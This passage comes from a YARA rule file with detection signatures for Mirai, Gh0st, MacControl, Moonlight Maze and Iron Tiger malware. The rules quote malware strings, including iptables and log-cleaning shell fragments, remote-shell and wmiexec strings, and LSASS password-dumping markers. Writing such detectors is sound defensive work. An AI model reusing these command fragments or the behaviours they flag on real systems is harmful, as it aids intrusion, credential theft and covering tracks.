SHA1 = "96f42a9fad2923281d21eca7ecdd3161d2b61655"
strings:
$dir1 = "/dev/watchdog"
$dir2 = "/dev/misc/watchdog"
$s1 = "PMMV"
$s2 = "ZOJFKRA"
$s3 = "FGDCWNV"
$s4 = "OMVJGP"
condition:
$dir1 and $dir2 and $s1 and $s2 and $s3 and not $s4
}
rule SSC_Mirai_MIPS_LSB : MALW
{
meta:
description = "Mirai Botnet TR-069 Worm - MIPS LSB"
author = "Felipe Molina / @felmoltor"
date = "2016-12-04"
version = "1.0"
MD5 = "bf650d39eb603d92973052ca80a4fdda"
SHA1 = "03ecd3b49aa19589599c64e4e7a51206a592b4ef"
ref1 = "http://www.theregister.co.uk/2016/11/28/router_flaw_exploited_in_massive_attack/"
ref2 = "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
ref3 = "https://krebsonsecurity.com/2016/11/new-mirai-worm-knocks-900k-germans-offline/"
strings:
$miname = "Myname--is:"
$iptables1 = "busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP"
$iptables2 = "busybox iptables -A INPUT -p tcp --destination-port 5555 -j DROP"
$procnet = "/proc/net/tcp"
condition:
$miname and $iptables1 and $iptables2 and $procnet
}
rule SSC_Mirai_Renesas_SH : MALW
{
meta:
description = "Mirai Botnet TR-069 Worm - Renesas SH LSB"
author = "Felipe Molina / @felmoltor"
date = "2016-12-04"
version = "1.0"
MD5 = "863dcf82883c885b0686dce747dcf502"
SHA1 = "bdc86295fad70480f0c6edcc37981e3cf11d838c"
ref1 = "http://www.theregister.co.uk/2016/11/28/router_flaw_exploited_in_massive_attack/"
ref2 = "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
ref3 = "https://krebsonsecurity.com/2016/11/new-mirai-worm-knocks-900k-germans-offline/"
strings:
$miname = "Myname--is:"
$iptables1 = "busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP"
$iptables2 = "busybox iptables -A INPUT -p tcp --destination-port 5555 -j DROP"
$procnet = "/proc/net/tcp"
condition:
$miname and $iptables1 and $iptables2 and $procnet
}
rule SSC_Mirai_4 : MALW
{
meta:
description = "Mirai Variant 4"
author = "Joan Soriano / @joanbtl"
date = "2017-04-16"
version = "1.0"
MD5 = "f832ef7a4fcd252463adddfa14db43fb"
SHA1 = "4455d237aadaf28aafce57097144beac92e55110"
strings:
$s1 = "210765"
$s2 = "qllw"
$s3 = ";;;;;;"
condition:
$s1 and $s2 and $s3
}
rule SSC_Mirai_PPC_Cisco : MALW
{
meta:
description = "Mirai Botnet TR-069 Worm - PowerPC or Cisco 4500"
author = "Felipe Molina / @felmoltor"
date = "2016-12-04"
version = "1.0"
MD5= "dbd92b08cbff8455ff76c453ff704dc6"
SHA1 = "6933d555a008a07b859a55cddb704441915adf68"
ref1 = "http://www.theregister.co.uk/2016/11/28/router_flaw_exploited_in_massive_attack/"
ref2 = "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
ref3 = "https://krebsonsecurity.com/2016/11/new-mirai-worm-knocks-900k-germans-offline/"
strings:
$miname = "Myname--is:"
$iptables1 = "busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP"
$iptables2 = "busybox iptables -A INPUT -p tcp --destination-port 5555 -j DROP"
$procnet = "/proc/net/tcp"
condition:
( $miname and $iptables1 and $iptables2 and $procnet )
}
rule SSC_Mirai_3 : MALW
{
meta:
description = "Mirai Variant 3"
author = "Joan Soriano / @joanbtl"
date = "2017-04-16"
version = "1.0"
MD5 = "bb22b1c921ad8fa358d985ff1e51a5b8"
SHA1 = "432ef83c7692e304c621924bc961d95c4aea0c00"
strings:
$dir1 = "/dev/watchdog"
$dir2 = "/dev/misc/watchdog"
$s1 = "PMMV"
$s2 = "ZOJFKRA"
$s3 = "FGDCWNV"
$s4 = "OMVJGP"
$ssl = "ssl3_ctrl"
condition:
$dir1 and $dir2 and $s1 and $s2 and $s3 and $s4 and not $ssl
}
rule SSC_Mirai_Dwnl : MALW
{
meta:
description = "Mirai Downloader"
author = "Joan Soriano / @joanbtl"
date = "2017-04-16"
version = "1.0"
MD5 = "85784b54dee0b7c16c57e3a3a01db7e6"
SHA1 = "6f6c625ef730beefbc23c7f362af329426607dee"
strings:
$s1 = "GET /mirai/"
$s2 = "dvrHelper"
condition:
$s1 and $s2
}
rule SSC_Mirai_MIPS_MSB : MALW
{
meta:
description = "Mirai Botnet TR-069 Worm - MIPS MSB"
author = "Felipe Molina / @felmoltor"
date = "2016-12-04"
version = "1.0"
MD5 = "0eb51d584712485300ad8e8126773941"
SHA1 = "18bce2f0107b5fab1b0b7c453e2a6b6505200cbd"
ref1 = "http://www.theregister.co.uk/2016/11/28/router_flaw_exploited_in_massive_attack/"
ref2 = "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
ref3 = "https://krebsonsecurity.com/2016/11/new-mirai-worm-knocks-900k-germans-offline/"
strings:
$miname = "Myname--is:"
$iptables1 = "busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP"
$iptables2 = "busybox iptables -A INPUT -p tcp --destination-port 5555 -j DROP"
$procnet = "/proc/net/tcp"
condition:
$miname and $iptables1 and $iptables2 and $procnet
}
rule SSC_Mirai_ARM_LSB : MALW
{
meta:
description = "Mirai Botnet TR-069 Worm - ARM LSB"
author = "Felipe Molina / @felmoltor"
date = "2016-12-04"
version = "1.0"
MD5= "eba670256b816e2d11f107f629d08494"
SHA1 = "8a25dee4ea7d61692b2b95bd047269543aaf0c81"
ref1 = "http://www.theregister.co.uk/2016/11/28/router_flaw_exploited_in_massive_attack/"
ref2 = "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
ref3 = "https://krebsonsecurity.com/2016/11/new-mirai-worm-knocks-900k-germans-offline/"
strings:
$miname = "Myname--is:"
$iptables1 = "busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP"
$iptables2 = "busybox iptables -A INPUT -p tcp --destination-port 5555 -j DROP"
$procnet = "/proc/net/tcp"
condition:
$miname and $iptables1 and $iptables2 and $procnet
}
rule SSC_Mirai_5 : MALW
{
meta:
description = "Mirai Variant 5"
author = "Joan Soriano / @joanbtl"
date = "2017-04-16"
version = "1.0"
MD5 = "7e17c34cddcaeb6755c457b99a8dfe32"
SHA1 = "b63271672d6a044704836d542d92b98e2316ad24"
strings:
$dir1 = "/dev/watchdog"
$dir2 = "/dev/misc/watchdog"
$s1 = "PMMV"
$s2 = "ZOJFKRA"
$s3 = "FGDCWNV"
$s4 = "OMVJGP"
$ssl = "ssl3_ctrl"
condition:
$dir1 and $dir2 and $s1 and $s2 and $s3 and $s4 and $ssl
}
rule SSC_Mirai_Generic_Arch : MALW
{
meta:
description = "Mirai Botnet TR-069 Worm - Generic Architecture"
author = "Felipe Molina / @felmoltor"
date = "2016-12-04"
version = "1.0"
ref1 = "http://www.theregister.co.uk/2016/11/28/router_flaw_exploited_in_massive_attack/"
ref2 = "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
ref3 = "https://krebsonsecurity.com/2016/11/new-mirai-worm-knocks-900k-germans-offline/"
strings:
$miname = "Myname--is:"
$iptables1 = "busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP"
$iptables2 = "busybox iptables -A INPUT -p tcp --destination-port 5555 -j DROP"
$procnet = "/proc/net/tcp"
condition:
$miname and $iptables1 and $iptables2 and $procnet
}
rule SSC_Trojan_W32_Gh0stMiancha_1_0_0
{
meta:
Author      = "Context Threat Intelligence"
Date        = "2014/01/27"
Description = "Bytes inside"
Reference   = "http://www.contextis.com/documents/30/TA10009_20140127_-_CTI_Threat_Advisory_-_The_Monju_Incident1.pdf"
strings:
$0x = { 57 5b 5a 5a 51 57 40 34 31 67 2e 31 70 34 5c 40 40 44 3b 25 3a 19 1e 5c 7b 67 60 2e 34 31 67 2e 31 70 19 1e 55 77 77 71 64 60 2e 34 3e 3b 3e 19 1e 57 7b 7a 60 71 7a 60 39 40 6d 64 71 2e 34 60 71 6c 60 3b 7c 60 79 78 19 1e 44 66 7b 6c 6d 39 57 7b 7a 7a 71 77 60 7d 7b 7a 2e 34 5f 71 71 64 39 55 78 7d 62 71 19 1e 57 7b 7a 60 71 7a 60 39 78 71 7a 73 60 7c 2e 34 24 19 1e 19 1e }
$1 = { 5c e7 99 bd e5 8a a0 e9 bb 91 5c }
$1x = { 48 f3 8d a9 f1 9e b4 fd af 85 48 }
$2 = "DllCanLoadNow"
$2x = { 50 78 78 57 75 7a 58 7b 75 70 5a 7b 63 }
$3x = { 5a 61 79 76 71 66 34 7b 72 34 67 61 76 7f 71 6d 67 2e 34 31 70 }
$4 = "JXNcc2hlbGxcb3Blblxjb21tYW5k"
$4x = { 5e 4c 5a 77 77 26 7c 78 76 53 6c 77 76 27 56 78 76 78 6c 7e 76 26 25 60 4d 43 21 7f }
$5 = "SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA=="
$5x = { 47 51 52 47 46 52 70 56 41 7f 42 77 46 51 42 40 45 25 5e 5e 41 52 46 5e 40 24 21 77 41 27 78 6e 70 53 42 60 4c 51 5a 78 76 7a 46 6d 4d 43 6c 45 77 79 2d 7e 4e 4c 5a 6e 76 27 5e 77 59 55 29 29 }
$6 = "C:\\Users\\why\\"
$6x = { 57 2e 48 41 67 71 66 67 48 63 7c 6d 48 }
$7 = "g:\\ykcx\\"
$7x = { 73 2E 48 6D 7F 77 6C 48 }
$8 = "(miansha)"
$8x = { 3C 79 7D 75 7A 67 7C 75 3D }
$9 = "server(\xE5\xA3\xB3)"
$9x = { 7C 2E 48 26 24 25 27 3A 25 25 3A 26 21 48 67 71 66 62 71 66 3C F1 B7 A7 3D 48 46 71 78 71 75 67 71 48 67 71 66 62 71 66 3A 64 70 76 }
$cfgDecode = { 8a ?? ?? 80 c2 7a 80 f2 19 88 ?? ?? 41 3b ce 7c ??}
condition:
any of them
}
rule SSC_MacControlCode : MacControl Family
{
meta:
description = "MacControl code tricks"
author = "Seth Hardy"
last_modified = "2014-06-17"
strings:
// Load these function strings 4 characters at a time. These check the first two blocks:
$L4_Accept = { C7 ?? 41 63 63 65 C7 ?? 04 70 74 3A 20 }
$L4_AcceptLang = { C7 ?? 41 63 63 65 C7 ?? 04 70 74 2D 4C }
$L4_Pragma = { C7 ?? 50 72 61 67 C7 ?? 04 6D 61 3A 20 }
$L4_Connection = { C7 ?? 43 6F 6E 6E C7 ?? 04 65 63 74 69 }
$GEThgif = { C7 ?? 47 45 54 20 C7 ?? 04 2F 68 2E 67 }
condition:
all of ($L4*) or $GEThgif
}
rule SSC_MacControlStrings : MacControl Family
{
meta:
description = "MacControl Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-17"
strings:
$ = "HTTPHeadGet"
$ = "/Library/launched"
$ = "My connect error with no ip!"
$ = "Send File is Failed"
$ = "****************************You Have got it!****************************"
condition:
any of them
}
rule SSC_leverage_a
{
meta:
author = "earada@alienvault.com"
version = "1.0"
description = "OSX/Leverage.A"
date = "2013/09"
strings:
$a1 = "ioreg -l | grep \"IOPlatformSerialNumber\" | awk -F"
$a2 = "+:Users:Shared:UserEvent.app:Contents:MacOS:"
$a3 = "rm '/Users/Shared/UserEvent.app/Contents/Resources/UserEvent.icns'"
$script1 = "osascript -e 'tell application \"System Events\" to get the hidden of every login item'"
$script2 = "osascript -e 'tell application \"System Events\" to get the name of every login item'"
$script3 = "osascript -e 'tell application \"System Events\" to get the path of every login item'"
$properties = "serverVisible \x00"
condition:
all of them
}
rule SSC_ursnif_stariks_pdb {
strings:
$a = "stariks.pdb" nocase wide ascii
condition:
any of them
}
rule SSC_apt_RU_MoonlightMaze_u_logcleaner {
meta:
author = "Kaspersky Lab"
date = "2017-03-27"
version = "1.0"
last_modified = "2017-03-27"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect log cleaners based on utclean.c"
reference2 = "http://cd.textfiles.com/cuteskunk/Unix-Hacking-Exploits/utclean.c"
hash = "d98796dcda1443a37b124dbdc041fe3b"
hash = "73a518f0a73ab77033121d4191172820"
strings:
$a1="Hiding complit...n"
$a2="usage: %s <username> <fixthings> [hostname]"
$a3="ls -la %s* ; /bin/cp ./wtmp.tmp %s; rm ./wtmp.tmp"
condition:
(uint32(0)==0x464c457f) and (any of them)
}
rule SSC_apt_RU_MoonlightMaze_IRIX_exploit_GEN {
meta:
author = "Kaspersky Lab"
date = "2017-03-27"
version = "1.0"
last_modified = "2017-03-27"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect Irix exploits from David Hedley used by Moonlight Maze hackers"
reference2 = "https://www.exploit-db.com/exploits/19274/"
hash = "008ea82f31f585622353bd47fa1d84be" //df3
hash = "a26bad2b79075f454c83203fa00ed50c" //log
hash = "f67fc6e90f05ba13f207c7fdaa8c2cab" //xconsole
hash = "5937db3896cdd8b0beb3df44e509e136" //xlock
hash = "f4ed5170dcea7e5ba62537d84392b280" //xterm
strings:
$a1="stack = 0x%x, targ_addr = 0x%x"
$a2="execl failed"
condition:
(uint32(0)==0x464c457f) and (all of them)
}
rule SSC_apt_RU_MoonlightMaze_de_tool {
meta:
author = "Kaspersky Lab"
date = "2017-03-27"
version = "1.0"
last_modified = "2017-03-27"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect Moonlight Maze 'de' and 'deg' tunnel tool"
hash = "4bc7ed168fb78f0dc688ee2be20c9703"
hash = "8b56e8552a74133da4bc5939b5f74243"
strings:
$a1="Vnuk: %d" ascii fullword
$a2="Syn: %d" ascii fullword
//%s\r%s\r%s\r%s\r ->
$a3={25 73 0A 25 73 0A 25 73 0A 25 73 0A}
condition:
((2 of ($a*)))
}
rule SSC_apt_RU_MoonlightMaze_cle_tool {
meta:
author = "Kaspersky Lab"
date = "2017-03-27"
version = "1.0"
last_modified = "2017-03-27"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect Moonlight Maze 'cle' log cleaning tool"
hash = "647d7b711f7b4434145ea30d0ef207b0"
strings:
$a1="./a filename template_file" ascii wide
$a2="May be %s is empty?" ascii wide
$a3="template string = |%s|" ascii wide
$a4="No blocks !!!"
$a5="No data in this block !!!!!!" ascii wide
$a6="No good line"
condition:
((3 of ($a*)))
}
rule SSC_apt_RU_MoonlightMaze_customsniffer {
meta:
author = "Kaspersky Lab"
date = "2017-03-15"
version = "1.1"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect Moonlight Maze sniffer tools"
hash = "7b86f40e861705d59f5206c482e1f2a5"
hash = "927426b558888ad680829bd34b0ad0e7"
original_filename = "ora;tdn"
strings:
//strings from ora ->
$a1="/var/tmp/gogo" fullword
$a2="myfilename= |%s|" fullword
$a3="mypid,mygid=" fullword
$a4="mypid=|%d| mygid=|%d|" fullword
//strings from tdn ->
$a5="/var/tmp/task" fullword
$a6="mydevname= |%s|" fullword
condition:
((any of ($a*)))
}
rule SSC_apt_RU_MoonlightMaze_xk_keylogger {
meta:
author = "Kaspersky Lab"
date = "2017-03-27"
version = "1.0"
last_modified = "2017-03-27"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect Moonlight Maze 'xk' keylogger"
strings:
$a1="Log ended at => %s"
$a2="Log started at => %s [pid %d]"
$a3="/var/tmp/task" fullword
$a4="/var/tmp/taskhost" fullword
$a5="my hostname: %s"
$a6="/var/tmp/tasklog"
$a7="/var/tmp/.Xtmp01" fullword
$a8="myfilename=-%s-"
$a9="/var/tmp/taskpid"
$a10="mypid=-%d-" fullword
$a11="/var/tmp/taskgid" fullword
$a12="mygid=-%d-" fullword
condition:
((3 of ($a*)))
}
rule SSC_apt_RU_MoonlightMaze_customlokitools {
meta:
author = "Kaspersky Lab"
date = "2017-03-15"
version = "1.1"
last_modified = "2017-03-22"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect Moonlight Maze Loki samples by custom attackerauthored strings"
hash = "14cce7e641d308c3a177a8abb5457019"
hash = "a3164d2bbc45fb1eef5fde7eb8b245ea"
hash = "dabee9a7ea0ddaf900ef1e3e166ffe8a"
hash = "1980958afffb6a9d5a6c73fc1e2795c2"
hash = "e59f92aadb6505f29a9f368ab803082e"
strings:
$a1="Write file Ok..." ascii wide
$a2="ERROR: Can not open socket...." ascii wide
$a3="Error in parametrs:" ascii wide
$a4="Usage: @<get/put> <IP> <PORT> <file>" ascii wide
$a5="ERROR: Not connect..." ascii wide
$a6="Connect successful...." ascii wide
$a7="clnt <%d> rqstd n ll kll" ascii wide
$a8="clnt <%d> rqstd swap" ascii wide
$a9="cld nt sgnl prcs grp" ascii wide
$a10="cld nt sgnl prnt" ascii wide
//keeping only ascii version of string ->
$a11="ork error" ascii fullword
condition:
((any of ($a*)))
}
rule SSC_apt_RU_MoonlightMaze_encrypted_keylog {
meta:
author = "Kaspersky Lab"
date = "2017-03-27"
version = "1.0"
last_modified = "2017-03-27"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
description = "Rule to detect Moonlight Maze encrypted keylogger logs"
strings:
$a1={47 01 22 2A 6D 3E 39 2C}
condition:
($a1 at 0)
}
rule SSC_loki2crypto {
meta:
author = "Costin Raiu, Kaspersky Lab"
date = "2017-03-21"
version = "1.0"
description = "Rule to detect hardcoded DH modulus used in 1996/1997 Loki2 sourcecode; #ifdef STRONG_CRYPTO /* 384-bit strong prime */"
reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
hash = "19fbd8cbfb12482e8020a887d6427315"
hash = "ea06b213d5924de65407e8931b1e4326"
hash = "14ecd5e6fc8e501037b54ca263896a11"
hash = "e079ec947d3d4dacb21e993b760a65dc"
hash = "edf900cebb70c6d1fcab0234062bfc28"
strings:
$modulus={DA E1 01 CD D8 C9 70 AF C2 E4 F2 7A 41 8B 43 39 52 9B 4B 4D E5 85 F8 49}
condition:
(any of them)
}
rule SSC_IronTiger_ChangePort_Toolkit_driversinstall
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - Changeport Toolkit driverinstall"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "openmydoor" nocase wide ascii
$str2 = "Install service error" nocase wide ascii
$str3 = "start remove service" nocase wide ascii
$str4 = "NdisVersion" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (2 of ($str*))
}
rule SSC_IronTiger_Gh0stRAT_variant
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "This is a detection for a s.exe variant seen in Op. Iron Tiger"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "Game Over Good Luck By Wind" nocase wide ascii
$str2 = "ReleiceName" nocase wide ascii
$str3 = "jingtisanmenxiachuanxiao.vbs" nocase wide ascii
$str4 = "Winds Update" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (any of ($str*))
}
rule SSC_IronTiger_ReadPWD86
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - ReadPWD86"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "Fail To Load LSASRV" nocase wide ascii
$str2 = "Fail To Search LSASS Data" nocase wide ascii
$str3 = "User Principal" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (all of ($str*))
}
rule SSC_IronTiger_GTalk_Trojan
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - GTalk Trojan"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "gtalklite.com" nocase wide ascii
$str2 = "computer=%s&lanip=%s&uid=%s&os=%s&data=%s" nocase wide ascii
$str3 = "D13idmAdm" nocase wide ascii
$str4 = "Error: PeekNamedPipe failed with %i" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (2 of ($str*))
}
rule SSC_IronTiger_NBDDos_Gh0stvariant_dropper
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - NBDDos Gh0stvariant Dropper"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "This service can't be stoped." nocase wide ascii
$str2 = "Provides support for media palyer" nocase wide ascii
$str4 = "CreaetProcess Error" nocase wide ascii
$bla1 = "Kill You" nocase wide ascii
$bla2 = "%4.2f GB" nocase wide ascii
condition:
uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))
}
rule SSC_IronTiger_Ring_Gh0stvariant
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - Ring Gh0stvariant"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "RING RAT Exception" nocase wide ascii
$str2 = "(can not update server recently)!" nocase wide ascii
$str4 = "CreaetProcess Error" nocase wide ascii
$bla1 = "Sucess!" nocase wide ascii
$bla2 = "user canceled!" nocase wide ascii
condition:
uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))
}
rule SSC_IronTiger_dllshellexc2010
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "dllshellexc2010 Exchange backdoor + remote shell"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "Microsoft.Exchange.Clients.Auth.dll" nocase ascii wide
$str2 = "Dllshellexc2010" nocase wide ascii
$str3 = "Users\\ljw\\Documents" nocase wide ascii
$bla1 = "please input path" nocase wide ascii
$bla2 = "auth.owa" nocase wide ascii
condition:
(uint16(0) == 0x5a4d) and ((any of ($str*)) or (all of ($bla*)))
}
rule SSC_IronTiger_PlugX_FastProxy
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - PlugX FastProxy"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "SAFEPROXY HTServerTimer Quit!" nocase wide ascii
$str2 = "Useage: %s pid" nocase wide ascii
$str3 = "%s PORT[%d] TO PORT[%d] SUCCESS!" nocase wide ascii
$str4 = "p0: port for listener" nocase wide ascii
$str5 = "\\users\\whg\\desktop\\plug\\" nocase wide ascii
$str6 = "[+Y] cwnd : %3d, fligth:" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (any of ($str*))
}
rule SSC_IronTiger_ChangePort_Toolkit_ChangePortExe
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - Toolkit ChangePort"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "Unable to alloc the adapter!" nocase wide ascii
$str2 = "Wait for master fuck" nocase wide ascii
$str3 = "xx.exe <HOST> <PORT>" nocase wide ascii
$str4 = "chkroot2007" nocase wide ascii
$str5 = "Door is bind on %s" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (2 of ($str*))
}
rule SSC_IronTiger_dnstunnel
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "This rule detects a dns tunnel tool used in Operation Iron Tiger"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "\\DnsTunClient\\" nocase wide ascii
$str2 = "\\t-DNSTunnel\\" nocase wide ascii
$str3 = "xssok.blogspot" nocase wide ascii
$str4 = "dnstunclient" nocase wide ascii
$mistake1 = "because of error, can not analysis" nocase wide ascii
$mistake2 = "can not deal witn the error" nocase wide ascii
$mistake3 = "the other retun one RST" nocase wide ascii
$mistake4 = "Coversation produce one error" nocase wide ascii
$mistake5 = "Program try to use the have deleted the buffer" nocase wide ascii
condition:
(uint16(0) == 0x5a4d) and ((any of ($str*)) or (any of ($mistake*)))
}
rule SSC_IronTiger_EFH3_encoder
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger EFH3 Encoder"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "EFH3 [HEX] [SRCFILE] [DSTFILE]" nocase wide ascii
$str2 = "123.EXE 123.EFH" nocase wide ascii
$str3 = "ENCODER: b[i]: = " nocase wide ascii
condition:
uint16(0) == 0x5a4d and (any of ($str*))
}
rule SSC_IronTiger_GetPassword_x64
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - GetPassword x64"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "(LUID ERROR)" nocase wide ascii
$str2 = "Users\\K8team\\Desktop\\GetPassword" nocase wide ascii
$str3 = "Debug x64\\GetPassword.pdb" nocase wide ascii
$bla1 = "Authentication Package:" nocase wide ascii
$bla2 = "Authentication Domain:" nocase wide ascii
$bla3 = "* Password:" nocase wide ascii
$bla4 = "Primary User:" nocase wide ascii
condition:
uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))
}
rule SSC_IronTiger_PlugX_DosEmulator
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - PlugX DosEmulator"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "Dos Emluator Ver" nocase wide ascii
$str2 = "\\PIPE\\FASTDOS" nocase wide ascii
$str3 = "FastDos.cpp" nocase wide ascii
$str4 = "fail,error code = %d." nocase wide ascii
condition:
uint16(0) == 0x5a4d and (any of ($str*))
}
rule SSC_IronPanda_Malware1
{
meta:
description = "Iron Panda Malware"
author = "Florian Roth"
reference = "https://goo.gl/E4qia9"
date = "2015-09-16"
hash = "a0cee5822ddf254c254a5a0b7372c9d2b46b088a254a1208cb32f5fe7eca848a"
strings:
$x1 = "activedsimp.dll" fullword wide
$s1 = "get_BadLoginAddress" fullword ascii
$s2 = "get_LastFailedLogin" fullword ascii
$s3 = "ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED" fullword ascii
$s4 = "get_PasswordExpirationDate" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_IronPanda_Malware_Htran
{
meta:
description = "Iron Panda Malware Htran"
author = "Florian Roth"
reference = "https://goo.gl/E4qia9"
date = "2015-09-16"
hash = "7903f94730a8508e9b272b3b56899b49736740cea5037ea7dbb4e690bcaf00e7"
strings:
$s1 = "[-] Gethostbyname(%s) error:%s" fullword ascii
$s2 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
$s3 = "-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
$s4 = "[-] ERROR: Must supply logfile name." fullword ascii
$s5 = "[SERVER]connection to %s:%d error" fullword ascii
$s6 = "[+] Make a Connection to %s:%d...." fullword ascii
$s7 = "[+] Waiting another Client on port:%d...." fullword ascii
$s8 = "[+] Accept a Client on port %d from %s" fullword ascii
$s9 = "[+] Make a Connection to %s:%d ......" fullword ascii
$s10 = "cmshared_get_ptr_from_atom" fullword ascii
$s11 = "_cmshared_get_ptr_from_atom" fullword ascii
$s12 = "[+] OK! I Closed The Two Socket." fullword ascii
$s13 = "[-] TransmitPort invalid." fullword ascii
$s14 = "[+] Waiting for Client on port:%d ......" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 125KB and 3 of them ) or 5 of them
}
rule SSC_IronTiger_wmiexec
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Tool - wmi.vbs detection"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "Temp Result File , Change it to where you like" nocase wide ascii
$str2 = "wmiexec" nocase wide ascii
$str3 = "By. Twi1ight" nocase wide ascii
$str4 = "[both mode] ,delay TIME to read result" nocase wide ascii
$str5 = "such as nc.exe or Trojan" nocase wide ascii
$str6 = "+++shell mode+++" nocase wide ascii
$str7 = "win2008 fso has no privilege to delete file" nocase wide ascii
condition:
2 of ($str*)
}
rule SSC_IronTiger_HTTPBrowser_Dropper
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - HTTPBrowser Dropper"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = ".dllUT" nocase wide ascii
$str2 = ".exeUT" nocase wide ascii
$str3 = ".urlUT" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (2 of ($str*))
}
rule SSC_IronTiger_PlugX_Server
{
meta:
author = "Cyber Safety Solutions, Trend Micro"
description = "Iron Tiger Malware - PlugX Server"
reference = "http://goo.gl/T5fSJC"
strings:
$str1 = "\\UnitFrmManagerKeyLog.pas" nocase wide ascii
$str2 = "\\UnitFrmManagerRegister.pas" nocase wide ascii
$str3 = "Input Name..." nocase wide ascii
$str4 = "New Value#" nocase wide ascii
$str5 = "TThreadRControl.Execute SEH!!!" nocase wide ascii
$str6 = "\\UnitFrmRControl.pas" nocase wide ascii
$str7 = "OnSocket(event is error)!" nocase wide ascii
$str8 = "Make 3F Version Ok!!!" nocase wide ascii
$str9 = "PELEASE DO NOT CHANGE THE DOCAMENT" nocase wide ascii
$str10 = "Press [Ok] Continue Run, Press [Cancel] Exit" nocase wide ascii
condition:
uint16(0) == 0x5a4d and (2 of ($str*))
}
rule SSC_IronPanda_Malware2
{
meta:
description = "Iron Panda Malware"
author = "Florian Roth"
reference = "https://goo.gl/E4qia9"
date = "2015-09-16"
hash = "a89c21dd608c51c4bf0323d640f816e464578510389f9edcf04cd34090decc91"
strings:
$s0 = "\\setup.exe" fullword ascii
$s1 = "msi.dll.urlUT" fullword ascii
$s2 = "msi.dllUT" fullword ascii
$s3 = "setup.exeUT" fullword ascii
$s4 = "/c del /q %s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 180KB and all of them
}
rule SSC_IronPanda_DNSTunClient
{
meta:
description = "Iron Panda malware DnsTunClient - file named.exe"
author = "Florian Roth"
reference = "https://goo.gl/E4qia9"
date = "2015-09-16"
score = 80
hash = "a08db49e198068709b7e52f16d00a10d72b4d26562c0d82b4544f8b0fb259431"
strings:
